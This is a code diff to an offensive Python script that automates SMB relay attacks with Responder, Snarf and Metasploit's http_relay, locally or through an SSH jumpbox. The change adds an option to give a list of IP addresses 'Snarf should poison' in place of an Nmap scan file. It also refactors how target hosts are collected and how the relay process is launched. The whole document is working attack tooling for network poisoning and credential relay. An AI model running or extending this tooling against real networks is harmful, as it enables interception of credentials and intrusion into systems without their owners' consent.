@@ -25,6 +25,7 @@ def parse_args():
     parser.add_argument("-i", "--interface", help="The interface that Responder and Snarf will start use")
     parser.add_argument("-r", "--remote", help="The jumpbox IP address")
     parser.add_argument("-p", "--port", type=int, default=22, help="The jumpbox SSH port")
+    parser.add_argument("-l", "--list-ips", help="List of hosts Snarf should poison")
     return parser.parse_args()
 
 def get_git_project(github_url, home_dir):
@@ -64,6 +65,7 @@ def get_smb_hosts(report):
     with open('smb_hosts.txt', 'w') as smb:
         for h in smb_hosts:
             smb.write(h+'\n')
+    return 'smb_hosts.txt'
 
 def get_nodejs():
     '''
@@ -202,6 +204,7 @@ def is_process_running(process_id):
 ################
 
 def jumpbox_ip_interface(ssh, iface):
+    found = False
     cmd = 'ip addr'
     stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)
     out = stdout.readlines()
@@ -209,11 +212,13 @@ def jumpbox_ip_interface(ssh, iface):
         l = l.split()
         if len(l) > 1:
             if iface in l[1]:
-                # comes out as "eth0:" so we get rid of the colon
-                if 'inet' in l[0]:
-                    # comes out as "10.0.0.1/25" so we get rid of /25
-                    ip = l[1].split('/')[0]
-                    return ip
+                found = True
+                continue
+        if found == True:
+            if 'inet' in l[0]:
+                # comes out as "10.0.0.1/25" so we get rid of /25
+                ip = l[1].split('/')[0]
+                return ip
 
 def remote_check_for_folder(ssh, folder, check_error=False):
     cmd = 'cd {}'.format(folder)
@@ -386,8 +391,18 @@ def remote_main(args):
     pw = getpass.getpass()
     ssh = ssh_client(jumpbox_ip, port, user, pw)
     scp = SCPClient(ssh.get_transport())
-    report = NmapParser.parse_fromfile(args.nmapxml)
     j_local_ip = jumpbox_ip_interface(ssh, iface)
+    if j_local_ip == None:
+        sys.exit('[-] Could not find local IP address for {}. Check function jumpbox_ip_interface()'.format(iface))
+
+    # Get SMB hosts
+    hostfile = get_SMB_hosts(args)
+    local_path = os.getcwd()+'/{}'.format(hostfile)
+    remote_path = '{}snarf/{}'.format(home_dir, hostfile)
+    try:
+        scp.put(local_path, remote_path)
+    except scp.SCPException:
+        sys.exit('[-] Failed to copy smb_hosts.txt to the remote jumpbox')
 
     # Print vars
     print '[*] Jumpbox IP: {}'.format(jumpbox_ip)
@@ -401,16 +416,6 @@ def remote_main(args):
     # Get Nodejs
     cmd = 'apt-get install nodejs -y'
     stdin, stdout, stderr = run_jumpbox_cmd(ssh, cmd, check_error=True)
-
-    # Get SMB hosts
-    report = NmapParser.parse_fromfile(args.nmapxml)
-    get_smb_hosts(report)
-    local_path = os.getcwd()+'/smb_hosts.txt'
-    remote_path = '{}snarf/smb_hosts.txt'.format(home_dir)
-    try:
-        scp.put(local_path, remote_path)
-    except scp.SCPException:
-        sys.exit('[-] Failed to copy smb_hosts.txt to the remote jumpbox')
 
     # Run Snarf
     cmd = 'screen -S snarf -dm nodejs {}snarf/snarf.js -f {}snarf/smb_hosts.txt {}'.format(home_dir, home_dir, j_local_ip)
@@ -446,6 +451,14 @@ def remote_main(args):
         remote_cleanup(ssh, scp, forw_server, home_dir)
         sys.exit()
 
+def get_SMB_hosts(args):
+    if args.nmapxml:
+        report = NmapParser.parse_fromfile(args.nmapxml)
+        hostfile = get_smb_hosts(report)
+    elif args.list_ips:
+        hostfile = args.list_ips
+    return hostfile
+
 def local_main(args):
 
     home_dir = args.home_dir
@@ -454,7 +467,8 @@ def local_main(args):
         ip = ifaddresses(iface)[AF_INET][0]['addr']
     except ValueError:
         sys.exit('[-] Provide a valid interface. See interfaces with `ip addr`')
-    report = NmapParser.parse_fromfile(args.nmapxml)
+
+    hostfile = get_SMB_hosts(args)
 
     # Get Snarf
     github_url = 'https://github.com/purpleteam/snarf'
@@ -466,12 +480,8 @@ def local_main(args):
     # Start MSF http_relay
     msf_pid = start_msf_http_relay(ip, home_dir)
 
-    # Get SMB hosts
-    report = NmapParser.parse_fromfile(args.nmapxml)
-    get_smb_hosts(report)
-
     # Run Snarf
-    cmd = 'screen -S snarf -dm nodejs {}snarf/snarf.js -f smb_hosts.txt {}'.format(home_dir, ip)
+    cmd = 'screen -S snarf -dm nodejs {}snarf/snarf.js -f {} {}'.format(home_dir,hostfile,ip)
     time.sleep(1) # If this isn't here the PID of the snarf screen is -3 compared to ps faux??
     out, err, snarf_pid = run_cmd(cmd)
 
@@ -510,8 +520,11 @@ def main(args):
     # Initial var setup
     if os.geteuid():
         sys.exit('[-] Run as root')
-    if not args.nmapxml:
-        sys.exit('[-] Include an nmap XML file for determining SMB hosts, e.g. -x network.xml')
+    if args.list_ips and args.nmapxml:
+        sys.exit('[-] Choose to only parse either a list of IPs for Snarf to poison or an Nmap XML file\
+that will be parsed for systems with port 445 open.')
+    if not args.nmapxml and not args.list_ips:
+        sys.exit('[-] Include an nmap XML file (-x nmap.xml) which will be parsed for IPs with port 445 open or include a list of IPs for Snarf (-l IPs.txt)')
     if not args.interface:
         sys.exit('[-] Include an interface for which Responder and Snarf will utilize, e.g. -i eth0')
 
